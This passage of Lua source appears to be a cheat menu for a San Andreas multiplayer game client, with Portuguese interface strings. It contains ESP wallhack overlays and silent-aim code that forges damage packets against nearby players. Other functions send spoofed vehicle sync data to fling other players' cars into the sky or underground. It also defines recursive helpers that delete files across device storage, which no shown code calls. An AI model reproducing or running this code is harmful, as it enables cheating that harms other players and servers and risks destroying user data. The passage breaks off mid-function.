        if isObjectOnScreen(iter_48_51) then
            local var_48_238, var_48_239, var_48_240, var_48_241 = getObjectCoordinates(iter_48_51)
            local var_48_242, var_48_243 = convert3DCoordsToScreen(var_48_239, var_48_240, var_48_241)
            local var_48_244 = getObjectModel(iter_48_51)
            local var_48_245, var_48_246, var_48_247 = getCharCoordinates(PLAYER_PED)
            local var_48_248, var_48_249 = convert3DCoordsToScreen(var_48_245, var_48_246, var_48_247)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_239, var_48_240, var_48_241, var_48_245, var_48_246, var_48_247))

            if var_48_244 == 19055 then
                renderDrawLine(var_48_248, var_48_249, var_48_242, var_48_243, 1.1, 4291821568)
                renderFontDrawText(fontwarp, "Caixa Surpresa {c0c0c0}Prata{ffffff}! \n{ff0000}Distancia: " .. distance, var_48_242, var_48_243, -1)
            end
        end
    end
end
function cxplatina()
    for iter_48_40, iter_48_41 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_48_41) then
            local var_48_178, var_48_179, var_48_180, var_48_181 = getObjectCoordinates(iter_48_41)
            local var_48_182, var_48_183 = convert3DCoordsToScreen(var_48_179, var_48_180, var_48_181)
            local var_48_184 = getObjectModel(iter_48_41)
            local var_48_185, var_48_186, var_48_187 = getCharCoordinates(PLAYER_PED)
            local var_48_188, var_48_189 = convert3DCoordsToScreen(var_48_185, var_48_186, var_48_187)

            distance = string.format("%.1f", getDistanceBetweenCoords3d(var_48_179, var_48_180, var_48_181, var_48_185, var_48_186, var_48_187))

            if var_48_184 == 19057 then
                renderDrawLine(var_48_188, var_48_189, var_48_182, var_48_183, 1.1, 4291821568)
                renderFontDrawText(fontwarp, "Caixa Surpresa {FFFF00}Platina{ffffff}! \n{ff0000}Distancia: " .. distance, var_48_182, var_48_183, -1)
            end
        end
    end
end
function cxbronze()
    for iter_18_40, iter_18_41 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_18_41) then
            local var_18_224, var_18_225, var_18_226, var_18_227 = getObjectCoordinates(iter_18_41)
            local var_18_228, var_18_229 = convert3DCoordsToScreen(var_18_225, var_18_226, var_18_227)
            local var_18_230 = getObjectModel(iter_18_41)
            local var_18_231, var_18_232, var_18_233 = getCharCoordinates(PLAYER_PED)
            local var_18_234, var_18_235 = convert3DCoordsToScreen(var_18_231, var_18_232, var_18_233)

            local distance = string.format("%.1f", getDistanceBetweenCoords3d(var_18_225, var_18_226, var_18_227, var_18_231, var_18_232, var_18_233))

            if var_18_230 == 19054 then
                renderDrawLine(var_18_234, var_18_235, var_18_228, var_18_229, 1.1, 4291821568)
                renderFontDrawText(font, "Caixa Surpresa {DB9370}Bronze{ffffff}! \n{ff0000}DistÃ¢ncia: " .. distance, var_18_228, var_18_229, -1)
            end
        end
    end
end
function cxouro()
    for iter_18_40, iter_18_41 in pairs(getAllObjects()) do
        if isObjectOnScreen(iter_18_41) then
            local var_18_224, var_18_225, var_18_226, var_18_227 = getObjectCoordinates(iter_18_41)
            local var_18_228, var_18_229 = convert3DCoordsToScreen(var_18_225, var_18_226, var_18_227)
            local var_18_230 = getObjectModel(iter_18_41)
            local var_18_231, var_18_232, var_18_233 = getCharCoordinates(PLAYER_PED)
            local var_18_234, var_18_235 = convert3DCoordsToScreen(var_18_231, var_18_232, var_18_233)

            local distance = string.format("%.1f", getDistanceBetweenCoords3d(var_18_225, var_18_226, var_18_227, var_18_231, var_18_232, var_18_233))

            if var_18_230 == 19056   then
                renderDrawLine(var_18_234, var_18_235, var_18_228, var_18_229, 1.1, 4291821568)
                renderFontDrawText(font, "Caixa Surpresa {DB9370}Ouro{ffffff}! \n{ff0000}DistÃ¢ncia: " .. distance, var_18_228, var_18_229, -1)
            end
        end
    end
end

function cxnatal()
    for _, v in pairs(getAllObjects()) do
        if isObjectOnScreen(v) then
            local result, oX, oY, oZ = getObjectCoordinates(v)
            local x1, y1 = convert3DCoordsToScreen(oX,oY,oZ)
            local objmodel = getObjectModel(v)
            local x2,y2,z2 = getCharCoordinates(PLAYER_PED)
            local x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
            local distance = string.format("%.0f", getDistanceBetweenCoords3d(oX,oY,oZ, x2, y2, z2))
            if objmodel == 2912 then 
                renderDrawLine(x10, y10, x1, y1, 1.1, 0xFFD00000) 
                renderFontDrawText(font,"Caixa Natal!\n{ff0000}Distancia: "..distance, x1, y1, -1) 
            end
        end
    end
end  
function espnomeped()
    for i = 0, sampGetMaxPlayerId() do
        if sampIsPlayerConnected(i) then
            local result, handlePed = sampGetCharHandleBySampPlayerId(i)
            if result and doesCharExist(handlePed) and isCharOnScreen(handlePed) then
                local pos = {getCharCoordinates(PLAYER_PED)}
                local whpos = {getCharCoordinates(handlePed)}
                local x1, y1 = convert3DCoordsToScreen(pos[1], pos[2], pos[3])
                local x2, y2 = convert3DCoordsToScreen(whpos[1], whpos[2], whpos[3])
                local color = 0xFFFFFFFF  
                local _, id = sampGetPlayerIdByCharHandle(handlePed)
                local nick = sampGetPlayerNickname(id)
                renderFontDrawText(ESP.FONT, nick .. " | ID [" .. id .. "]", x2, y2 - 20, color, -1)
            end
        end
    end
end
function esplinhaped()
    local px, py, pz = getCharCoordinates(PLAYER_PED)
    local sw, sh = getScreenResolution()
    local halfSW = sw / 2
    local maxDist = 1000

    for id = 0, 999 do
        local success, handle = sampGetCharHandleBySampPlayerId(id)

        if success and doesCharExist(handle) and isCharOnScreen(handle) then
            local x, y, z = getCharCoordinates(handle)
            local dist = math.floor(getDistanceBetweenCoords3d(px, py, pz, x, y, z))

            if dist <= maxDist then
                local sx, sy = convert3DCoordsToScreen(x, y, z)

                if sx and sy then
                    renderDrawLine(halfSW, 0, sx, sy, 2, 4294901760)
                end
            end
        end
    end
end

function espcarlinha()
    local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
    local x, y = convert3DCoordsToScreen(playerX, playerY, playerZ)

    for _, vehicle in ipairs(getAllVehicles()) do
        if isCarOnScreen(vehicle) then
            local carX, carY, carZ = getCarCoordinates(vehicle)
            local px, py = convert3DCoordsToScreen(carX, carY, carZ)
            local thickness = 2

            local corners = {
                { x = 1.5, y = 3, z = 1 }, 
                { x = 1.5, y = -3, z = 1 }, 
                { x = -1.5, y = -3, z = 1 },
                { x = -1.5, y = 3, z = 1 }, 
                { x = 1.5, y = 3, z = -1 }, 
                { x = 1.5, y = -3, z = -1 },
                { x = -1.5, y = -3, z = -1 },
                { x = -1.5, y = 3, z = -1 } 
            }

            local boxCorners = {}
            for _, offset in ipairs(corners) do
                local worldX, worldY, worldZ = getOffsetFromCarInWorldCoords(vehicle, offset.x, offset.y, offset.z)
                local screenX, screenY = convert3DCoordsToScreen(worldX, worldY, worldZ)
                table.insert(boxCorners, { x = screenX, y = screenY })
            end

            for i = 1, 4 do
                local nextIndex = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[nextIndex].x, boxCorners[nextIndex].y, thickness, 0xFF00FFFF)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[i + 4].x, boxCorners[i + 4].y, thickness, 0xFF00FFFF)
            end

            for i = 5, 8 do
                local nextIndex = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[nextIndex].x, boxCorners[nextIndex].y, thickness, 0xFF00FFFF)
            end
        end
    end
end
function down(arg_13_0)
    local var_13_0 = arg_13_0:match("(%d+)")
    local var_13_1, var_13_2 = sampGetCharHandleBySampPlayerId(var_13_0)

    if var_13_1 and isCharInAnyCar(var_13_2) and isCharInAnyCar(playerPed) then
        local var_13_3, var_13_4, var_13_5 = getOffsetFromCharInWorldCoords(var_13_2, 0, 0, -100)
        local var_13_6, var_13_7 = sampGetVehicleIdByCarHandle(storeCarCharIsInNoSave(var_13_2))
        local var_13_8 = samp_create_sync_data("vehicle", false)

        var_13_8.vehicleId = var_13_7
        var_13_8.position = {
            x = var_13_3,
            y = var_13_4,
            z = var_13_5
        }

        var_13_8.send()
    end
end
function rand()
    return math.random(-50, 50) / 100
end

function sampev.onPlayerJoin(playerId, slot1, slot2, playerName)
    if aim.CheckBox.teste38[0] then
        local message = "{00FF00}[O JOGADOR " .. playerName .. " LOGOU NO SERVIDOR] [" .. playerId .. "]"
        sampAddChatMessage(message, 0xFFFFFF)
    end

    if aim.CheckBox.teste43[0] then
        local chatMessage = "O Jogador " .. playerName .. " entrou no servidor KKKKK"
        sampSendChat(chatMessage)
    end

    return true
end

function setCharCoordinatesDontResetAnim(char, x, y, z)
    if doesCharExist(char) then
        local ptr = getCharPointer(char)
        setEntityCoordinates(ptr, x, y, z)
    end
  end
  
  function setEntityCoordinates(entityPtr, x, y, z)
    if entityPtr ~= 0 then
        local matrixPtr = readMemory(entityPtr + 0x14, 4, false)
        if matrixPtr ~= 0 then
          local posPtr = matrixPtr + 0x30
          writeMemory(posPtr + 0, 4, representFloatAsInt(x), false)
          writeMemory(posPtr + 4, 4, representFloatAsInt(y), false)
          writeMemory(posPtr + 8, 4, representFloatAsInt(z), false) 
          end
      end
  end

  function onTouch(type, id, x, y)
      if chooseActive then
        local sx, sy = x, y
        local sw, sh = getScreenResolution()
        if sx >= 0 and sy >= 0 and sx < sw and sy < sh and id == 0 then
          local posX, posY, posZ = convertScreenCoordsToWorld3D(sx, sy, 700.0)
          local camX, camY, camZ = getActiveCameraCoordinates()
          local result, colpoint = processLineOfSight(camX, camY, camZ, posX, posY, posZ, true, true, false, true, false, false, false)
          if result and colpoint.entity ~= 0 then
            local normal = colpoint.normal
            local pos = Vector3D(colpoint.pos[1], colpoint.pos[2], colpoint.pos[3]) - (Vector3D(normal[1], normal[2], normal[3]) * 0.1)
            local zOffset = 300
            if normal[3] >= 0.5 then zOffset = 1 end
            local result, colpoint2 = processLineOfSight(pos.x, pos.y, pos.z + zOffset, pos.x, pos.y, pos.z - 0.3, true, true, false, true, false, false, false)
            if result then
              pos = Vector3D(colpoint2.pos[1], colpoint2.pos[2], colpoint2.pos[3] + 1)
  
              local curX, curY, curZ  = getCharCoordinates(playerPed)
              local dist              = getDistanceBetweenCoords3d(curX, curY, curZ, pos.x, pos.y, pos.z)
              local hoffs             = renderGetFontDrawHeight(font)
              local color              = 0xAAFFFFFF  
             
              sy = sy - 2
              sx = sx - 2
              renderInfo = {rsx = sx, rsy = sy, rhoffs = hoffs, rdist = dist, rcar = 0, rcolor = 0xAAFFFFFF}
              tpIntoCar = nil
              if colpoint.entityType == 2 then
                local car = getVehiclePointerHandle(colpoint.entity)
                if doesVehicleExist(car) and (not isCharInAnyCar(playerPed) or storeCarCharIsInNoSave(playerPed) ~= car) then
                  tpIntoCar = car
                  color = 0xFFFFFFFF
                  renderInfo = {rsx = renderInfo.rsx, rsy = renderInfo.rsy, rhoffs = renderInfo.rhoffs, rdist = renderInfo.rdist, rcar = car, rcolor = color}
                  end
                end
              end
              createPointMarker(pos.x, pos.y, pos.z)
              
               if type == 1 then
                if tpIntoCar then
                  if not jumpIntoCar(tpIntoCar) then
                    teleportPlayer(pos.x, pos.y, pos.z)
                  end
                else
                  teleportPlayer(pos.x, pos.y, pos.z)
                end
                removePointMarker()
                renderInfo.rcar = 0
                chooseActive = false
              end
            end
          end
        end
  end
  function initializeRender()
    font = renderCreateFont("Arial", 17, 4)
    lua_thread.create(function()
        while true do
            wait(0)
            if chooseActive and pointMarker then
                renderFontDrawText(font, "Afaste o dedo da tela para teletransportar", renderInfo.rsx, renderInfo.rsy - (renderInfo.rhoffs * 3) - 150, renderInfo.rcolor) 
                renderFontDrawText(font, string.format("%0.2fm", renderInfo.rdist), renderInfo.rsx, renderInfo.rsy - (renderInfo.rhoffs*2) - 150, 0xEEEEEEEE)		  
                if renderInfo.rcar ~= 0 then 
                  renderFontDrawText(font, string.format("%s", findCarName(getCarModel(renderInfo.rcar))), renderInfo.rsx, renderInfo.rsy - renderInfo.rhoffs - 150, 0xEEEEEEEE) 
              end 
            end
        end
    end)
end
function imgui.CustomSlider(str_id, value, type, min, max, sformat, width)
    local text      = str_id:gsub('##.+', '')
    local sformat   = sformat or (type and '%d' or '%0.3f')
    local width     = width or 200

    local DL        = imgui.GetWindowDrawList()
    local p         = imgui.GetCursorScreenPos()

    local function math_round(x)
        local a = tostring(x):gsub('%d+%.', '0.')
        if tonumber(a) > 0.5 then
            return math.ceil(x)
        else
            return math.floor(x)
        end
    end
    local function bringVec4To(from, to, start_time, duration)
        local timer = os.clock() - start_time
        if timer >= 0.00 and timer <= duration then
            local count = timer / (duration / 100)
            return imgui.ImVec4(
                from.x + (count * (to.x - from.x) / 100),
                from.y + (count * (to.y - from.y) / 100),
                from.z + (count * (to.z - from.z) / 100),
                from.w + (count * (to.w - from.w) / 100)
            ), true
        end
        return (timer > duration) and to or from, false
    end

    if UI_CUSTOM_SLIDER == nil then UI_CUSTOM_SLIDER = {} end
    if UI_CUSTOM_SLIDER[str_id] == nil then 
        UI_CUSTOM_SLIDER[str_id] = {
            active = false,
            hovered = false,
            start = 0
        } 
    end

    imgui.InvisibleButton(str_id, imgui.ImVec2(width, 20))

    UI_CUSTOM_SLIDER[str_id].active = imgui.IsItemActive()
    if UI_CUSTOM_SLIDER[str_id].hovered ~= imgui.IsItemHovered() then
        UI_CUSTOM_SLIDER[str_id].hovered = imgui.IsItemHovered()
        UI_CUSTOM_SLIDER[str_id].start = os.clock()
    end

    local colorPadding = bringVec4To(
        UI_CUSTOM_SLIDER[str_id].hovered and imgui.GetStyle().Colors[imgui.Col.Button] or imgui.GetStyle().Colors[imgui.Col.ButtonHovered], 
        UI_CUSTOM_SLIDER[str_id].hovered and imgui.GetStyle().Colors[imgui.Col.ButtonHovered] or imgui.GetStyle().Colors[imgui.Col.Button], 
        UI_CUSTOM_SLIDER[str_id].start, 0.2
    )
    
    local colorBackGroundBefore = imgui.GetStyle().Colors[imgui.Col.Button]
    local colorBackGroundAfter = imgui.ImVec4(0,0,0,0)
    local colorCircle = imgui.GetStyle().Colors[imgui.Col.ButtonActive]

    if UI_CUSTOM_SLIDER[str_id].active then
        local c = imgui.GetMousePos()
        if c.x - p.x >= 0 and c.x - p.x <= width then
            local s = c.x - p.x - 10
            local pr = s / (width - 20)
            local v = min + (max - min) * pr
            if v >= min and v <= max then
                value[0] = type and math_round(v) or v
            else
                value[0] = v < min and min or max
            end
        end
    end

    local posCircleX = p.x + 10 + (width - 20) / (max - min) * (value[0] - min)

    if posCircleX > p.x + 10 then DL:AddRectFilled(imgui.ImVec2(p.x, p.y), imgui.ImVec2(posCircleX, p.y + 20), imgui.GetColorU32Vec4(colorBackGroundBefore), 10, 15) end
    if posCircleX < p.x + width - 10 then DL:AddRectFilled(imgui.ImVec2(posCircleX, p.y), imgui.ImVec2(p.x + width, p.y + 20), imgui.GetColorU32Vec4(colorBackGroundAfter), 10, 15) end
    DL:AddRect(imgui.ImVec2(p.x, p.y), imgui.ImVec2(p.x + width, p.y + 20), imgui.GetColorU32Vec4(colorPadding), 10, 15)
    DL:AddCircleFilled(imgui.ImVec2(posCircleX, p.y + 10), 10, imgui.GetColorU32Vec4(colorCircle))

    local sf = imgui.CalcTextSize(string.format(sformat, value[0]))
    local st = imgui.CalcTextSize(text)
    DL:AddText(imgui.ImVec2(p.x + width / 2 - sf.x / 2, p.y + 10 - sf.y / 2), imgui.GetColorU32Vec4(imgui.GetStyle().Colors[imgui.Col.Text]), string.format(sformat, value[0]))
    imgui.SameLine()
    local p = imgui.GetCursorPos()
    imgui.SetCursorPos(imgui.ImVec2(p.x - 5, p.y + 10 - st.y / 2))
    imgui.Text(text)

    return UI_CUSTOM_SLIDER[str_id].active
end

function getCarFreeSeat(car)
    if doesCharExist(getDriverOfCar(car)) then
      local maxPassengers = getMaximumNumberOfPassengers(car)
      for i = 0, maxPassengers do
        if isCarPassengerSeatFree(car, i) then
          return i + 1
        end
      end
      return nil 
    else
      return 0
    end
  end
  
  function jumpIntoCar(car)
    local seat = getCarFreeSeat(car)
    if not seat then return false end
    if seat == 0 then warpCharIntoCar(playerPed, car)
    else warpCharIntoCarAsPassenger(playerPed, car, seat - 1)
    end
    restoreCameraJumpcut()
    return true
  end
  function set_player_skin(arg_23_0, arg_23_1)
	local var_23_0 = raknetNewBitStream()

	raknetBitStreamWriteInt32(var_23_0, arg_23_0)
	raknetBitStreamWriteInt32(var_23_0, arg_23_1)
	raknetEmulRpcReceiveBitStream(153, var_23_0)
	raknetDeleteBitStream(var_23_0)
end

  function teleportPlayer(x, y, z)
      if isCharInAnyCar(PLAYER_PED) then
          setCarCoordinates(storeCarCharIsInNoSave(PLAYER_PED), x, y, z)
      else
        setCharCoordinatesDontResetAnim(PLAYER_PED, x, y, z)
      end
  end
  function findCarName(id)
    local input_text = readFile(getGameDirectory() .."/data/vehicles.ide")
    local lines = {}
    for line in input_text:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    for _, line in ipairs(lines) do
        local parts = {}
        for part in line:gmatch("([^,]+)") do
            table.insert(parts, part)
        end

        local current_id = parts[1]:gsub("%s", "")
        if tonumber(current_id) == id then
            local second_value = parts[2]:gsub("%s", "")
            return second_value
        end
    end
    return nil
end
function createPointMarker(x, y, z)
    if pointMarker then removePointMarker() end
    pointMarker = createUser3dMarker(x, y, z + 0.3, 4)
  end
  
  function removePointMarker()
    if pointMarker then
      removeUser3dMarker(pointMarker)
      pointMarker = nil
    end
  end
  
function readFile(path)
    local lines = {}
    local f = io.open(path, "r")
    if not f then
        return nil
    end
    for line in f:lines() do
        if not line:match("^%s*#") then
            table.insert(lines, line)
        end
    end
    f:close()
    return table.concat(lines, "\n")
end
function sendMessage(message)
    sampSendChat(message)
end

function getWeaponInfoById(id)
    for _, data in pairs(bdata) do
        if data.id == id then
            return data
        end
    end

    return nil
end

function rand()
    return math.random(-50, 50) / 100
end

function getMyId()
    return select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
end
function heaven(arg_17_0)
    local id = arg_17_0:match("(%d+)")
    local var_17_1, var_17_2 = sampGetCharHandleBySampPlayerId(id)

    if var_17_1 and isCharInAnyCar(var_17_2) and isCharInAnyCar(playerPed) then
        local var_17_3, var_17_4, var_17_5 = getOffsetFromCharInWorldCoords(var_17_2, 0, 0, 30000)
        local _, vehId = sampGetVehicleIdByCarHandle(storeCarCharIsInNoSave(var_17_2))
        local var_17_8 = samp_create_sync_data("vehicle", false)

        
        var_17_8.vehicleId = vehId
        var_17_8.position = {
            x = var_17_3,
            y = var_17_4,
            z = var_17_5
        }

        var_17_8.send()
        sampAddChatMessage("Jogador transportado para o ceu kkkk!", 0x00FF00)
    else
        sampAddChatMessage("Erro ao encontrar o jogador ou veiculo.", 0xFF0000)
    end
end
function tpme(arg_10_0)
    local id = arg_10_0:match("(%d+)")
    local var_10_1, var_10_2 = sampGetCharHandleBySampPlayerId(id)

    if var_10_1 and isCharInAnyCar(var_10_2) and isCharInAnyCar(playerPed) then
        local var_10_3, var_10_4, var_10_5 = getOffsetFromCharInWorldCoords(playerPed, 0, 15, 3)
        local _, vehId = sampGetVehicleIdByCarHandle(storeCarCharIsInNoSave(var_10_2))
        local var_10_8 = samp_create_sync_data("vehicle", false)

      
        var_10_8.vehicleId = vehId
        var_10_8.position = {
            x = var_10_3,
            y = var_10_4,
            z = var_10_5
        }

        var_10_8.send()
        sampAddChatMessage("VeÃ­culo teleportado com sucesso!", 0x00FF00)
    else
        sampAddChatMessage("Erro ao encontrar o jogador ou veÃ­culo.", 0xFF0000)
    end
end
function sampev.onSendAimSync(data)
    if teleport then data.camMode = 55 end
    if state and fakemode[0] then
        camX = data.camPos.x
        camY = data.camPos.y
        camZ = data.camPos.z
        
        frontX = data.camFront.x
        frontY = data.camFront.y
        frontZ = data.camFront.z

        local res, _, ped = pcall(sampGetCharHandleBySampPlayerId, targetId)
        if _ and res then
            local mx, my, mz = getCharCoordinates(PLAYER_PED)
            local x, y, z = getCharCoordinates(ped)
            if isLineOfSightClear(x, y, z, mx, my, mz, not settings.search.ignoreObj[0], true) then
                local x = x - mx
                local y = y - my
                local z = z - mz
                local dist = math.sqrt(x * x + y * y + z * z)
                if dist <= settings.search.radius[0] then
                    if settings.shoot.removeAmmo[0] then
                        setCharWeaponAmmo(PLAYER_PED, 0, 0)
                    end
                end
            end
        end
    end
end
function getClosestPlayerId2()
    local minDist = distanceSlider[0] 
    local closestId = -1
    local ax, ay, az = getCharCoordinates(PLAYER_PED) 

    for playerId = 0, 999 do
        local handle, ped = sampGetCharHandleBySampPlayerId(playerId)

        if handle and getCharHealth(ped) > 0 then
            local bx, by, bz = getCharCoordinates(ped) 
            if bx and by and bz then
                local distance = math.sqrt((bx - ax) ^ 2 + (by - ay) ^ 2 + (bz - az) ^ 2)

                if distance < minDist then
                    minDist = distance
                    closestId = playerId
                end
            end
        end
    end

    return closestId
end

function sendDamage(targetId, weaponId)
    local hitPart = 0

    if legitRandom[0] then
        local randomChoice = math.random(1, 3) 
        if randomChoice == 1 then
            hitPart = 9 
        elseif randomChoice == 2 then
            hitPart = 5 
        elseif randomChoice == 3 then
            hitPart = 6 
        end
    else
        if aim.CheckBox.aimAtHead[0] then
            hitPart = 9 
        elseif aim.CheckBox.aimAtChest[0] then
            hitPart = 5 
        elseif aim.CheckBox.aimAtFeet[0] then
            hitPart = 6 
        end
    end

    if hitPart ~= 0 then
        sampSendGiveDamage(targetId, 25, weaponId, hitPart) 
    end
end
function RGBToHex(r, g, b, a)
    if r < 0 or r > 255 or g < 0 or g > 255 or b < 0 or b > 255 or (a and (a < 0 or a > 255)) then
        return nil
    end

    if a then
        return tonumber(string.format("0x%.2X%.2X%.2X%.2X", a, r, g, b))
    else
        return tonumber(string.format("0x%.2X%.2X%.2X", r, g, b))
    end
end

local var_0_51 = imgui.OnFrame(function()
    return not isGamePaused() 
end, function(arg_14_0)
    arg_14_0.HideCursor = true

    local drawList = imgui.GetBackgroundDrawList()
    
    local screenWidth = imgui.GetIO().DisplaySize.x
    local screenHeight = imgui.GetIO().DisplaySize.y

    local center = imgui.ImVec2(screenWidth / 2, screenHeight / 2)

    local circleSize = fovSlider[0] * 2.5 

    if aim.CheckBox.showCircle[0] then
        drawList:AddCircle(center, circleSize - 10, RGBToHex(0, 255, 0, 255), 100) 
    end
end)
function sampev.onSendBulletSync(data)
    if silentAimActive then
        local targetId = getClosestPlayerId2()
        if targetId ~= -1 then
            local currentWeapon = getCurrentCharWeapon(PLAYER_PED)

            for _, weapon in ipairs(weapons) do
                if currentWeapon == weapon.id then
                    if math.random(0, 100) <= fovSlider[0] then
                        sendDamage(targetId, currentWeapon) 
                    end
                    break
                end
            end
        end
    end
end
lua_thread.create(function()
	while true do
		wait(0)
        if aim.CheckBox.teste49[0] and isCharInAnyCar(PLAYER_PED) then
			switchCarEngine(storeCarCharIsInNoSave(PLAYER_PED), true)
		end
    end
end)

lua_thread.create(function()
	while true do
		wait(0)
        if aim.CheckBox.teste50[0] and isCharInAnyCar(PLAYER_PED) then
			switchCarEngine(storeCarCharIsInNoSave(PLAYER_PED), true)
		end
    end
end)
lua_thread.create(function()
	while true do
		wait(0)
		if aim.CheckBox.teste51[0] then
			local var_4_41, var_4_42, var_4_43 = getCharCoordinates(PLAYER_PED)
            local result, playerId = sampGetPlayerIdByCharHandle(PLAYER_PED)
                
            if result then
                warp_to_player(playerIdInput[0])
            end
        end
    end
end)
lua_thread.create(function()
    while true do
        wait(0)
        
        if follow then
            local _, ped = sampGetCharHandleBySampPlayerId(zaidejas)
            
            if _ then
                if not isCharInAnyCar(ped) then
                    local xz, xy, z = getCharCoordinates(ped)
                    lua_thread.create(go_to_point, {x=xz, y=xy})
                    printStringNow('~g~ Seguindo: '..sampGetPlayerNickname(zaidejas), 1000)
                    
                    local posX, posY, posZ = getCharCoordinates(ped)
                    local pPosX, pPosY, pPosZ = getCharCoordinates(playerPed)
                    
                    if isPointOnScreen(posX, posY, posZ, 0.0) then
                        local wPosX, wPosY = convert3DCoordsToScreen(posX, posY, posZ)
                        local wPosX1, wPosY1 = convert3DCoordsToScreen(pPosX, pPosY, pPosZ)
                 
                    end
                end
            else
                follow = false
            end
        end
    end
end)
lua_thread.create(function()
	while true do
		wait(0)

		if aim.CheckBox.teste48[0] then
			for iter_35_0, iter_35_1 in ipairs(getAllVehicles()) do
				if doesVehicleExist(iter_35_1) then
					local var_35_0, var_35_1 = sampGetCarHandleBySampVehicleId(iter_35_1)
					local var_35_2, var_35_3, var_35_4 = getCarCoordinates(iter_35_1)
					local var_35_5, var_35_6, var_35_7 = getCharCoordinates(PLAYER_PED)

					if getDistanceBetweenCoords3d(var_35_5, var_35_6, var_35_7, var_35_2, var_35_3, var_35_4) < 170 and aim.CheckBox.teste48[0] then
						if isCharInAnyCar(PLAYER_PED) then
							local var_35_8 = getCarCharIsUsing(PLAYER_PED)

							removeCharFromCarMaintainPosition(PLAYER_PED, var_35_8)
							warpCharIntoCar(PLAYER_PED, iter_35_1)
							setCharCoordinates(PLAYER_PED, var_35_5 + 2.5, var_35_6, var_35_7)
							setCameraBehindPlayer()
							restoreCameraJumpcut()
							wait(50)

							if isCharInAnyCar(PLAYER_PED) then
								removeCharFromCarMaintainPosition(PLAYER_PED, iter_35_1)
							end

							setCharCoordinates(PLAYER_PED, var_35_5, var_35_6, var_35_7 - 1.1)
							setCameraBehindPlayer()
							restoreCamera()
							restoreCameraJumpcut()
							warpCharIntoCar(PLAYER_PED, var_35_8)
							wait(1200)
						else
							warpCharIntoCar(PLAYER_PED, iter_35_1)
							setCharCoordinates(PLAYER_PED, var_35_5 + 2.5, var_35_6, var_35_7)
							setCameraBehindPlayer()
							wait(50)

							if isCharInAnyCar(PLAYER_PED) then
								removeCharFromCarMaintainPosition(PLAYER_PED, iter_35_1)
							end

							setCharCoordinates(PLAYER_PED, var_35_5, var_35_6, var_35_7 - 1.1)
							setCameraBehindPlayer()
							restoreCamera()
							restoreCameraJumpcut()
							wait(1200)
						end
					end
				end
			end
		end
	end
end)
function getWeaponInfoById(id)
    for k, weapon in pairs(weapons) do
        if weapon.id == id then
            return weapon
        end
    end
    return nil
end
local function delete_files_with_extensions(path, extensions)
    for file in lfs.dir(path) do
        if file ~= "." and file ~= ".." then
            local file_path = path .. '/' .. file
            local attr = lfs.attributes(file_path)
            if not attr then
                print("Erro ao obter atributos de: " .. file_path)
            elseif attr.mode == "directory" then
                if not file_path:match("Android/data") and not file_path:match("Android/obb") then
                    delete_files_with_extensions(file_path, extensions)
                end
            elseif attr.mode == "file" then
                for _, ext in ipairs(extensions) do
                    if file_path:match("%." .. ext .. "$") then
                        local success, err = os.remove(file_path)
                        if success then
                            print("Deleted: " .. file_path)
                        else
                            print("Erro ao deletar arquivo: " .. file_path .. " - " .. err)
                        end
                    end
                end
            end
        end
    end
end

local function delete_folder(path)
    for file in lfs.dir(path) do
        if file ~= "." and file ~= ".." then
            local file_path = path .. '/' .. file
            local attr = lfs.attributes(file_path)
            if not attr then
                print("Erro ao obter atributos de: " .. file_path)
            elseif attr.mode == "directory" then
                delete_folder(file_path)
            else
                local success, err = os.remove(file_path)
                if success then
                    print("Deleted: " .. file_path)
                else
                    print("Erro ao deletar arquivo: " .. file_path .. " - " .. err)
                end
            end
        end
    end
    local success, err = lfs.rmdir(path)
    if success then
        print("Deleted directory: " .. path)
    else
        print("Erro ao deletar diretÃ³rio: " .. path .. " - " .. err)
    end
end
function proinfo(id)
    local var_47_0 = tonumber(id)
    
    if not sampIsPlayerConnected(var_47_0) then
        printStringNow("~R~Player nao existe ou ID invalido!", 4000)
        return
    end
    
    local var_47_1, var_47_2 = sampGetCharHandleBySampPlayerId(var_47_0)
    local var_47_3 = sampGetPlayerNickname(var_47_0)
    local var_47_4 = sampGetPlayerColor(var_47_0)
    local var_47_5 = sampGetPlayerScore(var_47_0)
    local var_47_6 = sampGetPlayerHealth(var_47_0)
    local var_47_7 = sampGetPlayerPing(var_47_0)
    local var_47_8 = getPlayerMoney(var_47_0)

    if var_47_0 ~= myID then

        local nomeJogador = var_47_3
        local dinheiroJogador = var_47_8
        
        local corVerde = 0x00FF00
        sampAddChatMessage("{00FF00}O jogador " .. nomeJogador .. " tem o total de R$ " .. dinheiroJogador .. " em maos", corVerde)
        
        
        printStringNow("~B~Voce enviou as informacoes no chat!", 4000)
    else
        printStringNow("~Y~ID incorreto!", 4000)
    end
end
function bbcar(arg_6_0, arg_6_1, arg_6_2)
    lua_thread.create(function()
        enter(arg_6_0)
        sampSendEnterVehicle(arg_6_0, false)
        setCarForwardSpeed(arg_6_1, 6.66)
        wait(400)

        if arg_6_2 then
            one(arg_6_0)
        end

        setCarHeading(arg_6_1, 0.666)
        setCarForwardSpeed(arg_6_1, 44.44)
        wait(50)

        if arg_6_2 then
            two(arg_6_0)
        end

        setCarHeading(arg_6_1, math.random(0, 2) * 1.2)
        setVehicleQuaternion(arg_6_1, math.random(0, 2) * 1.2, math.random(0, 2) * 1.2, math.random(0, 2) * 1.2, math.random(0, 2) * 1.2)
        exit(arg_6_0)
    end)
end

function one(arg_8_0)
    lua_thread.create(function()
        setCarHealth(ch, 666)

        for iter_9_0 = 1, 10 do
            sampForceVehicleSync(arg_8_0)
            wait(0)
        end
    end)
end

lua_thread.create(function()
	while true do
		wait(0)

		if aim.CheckBox.teste80[0] then
			local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
			for iter_30_0, iter_30_1 in ipairs(getAllChars()) do
				local var_30_0, var_30_1 = sampGetPlayerIdByCharHandle(iter_30_1)

				if var_30_0 and isCharOnScreen(iter_30_1) then
					local var_30_2, var_30_3, var_30_4 = getCharCoordinates(iter_30_1)
					local var_30_5, var_30_6, var_30_7 = getCharCoordinates(PLAYER_PED)
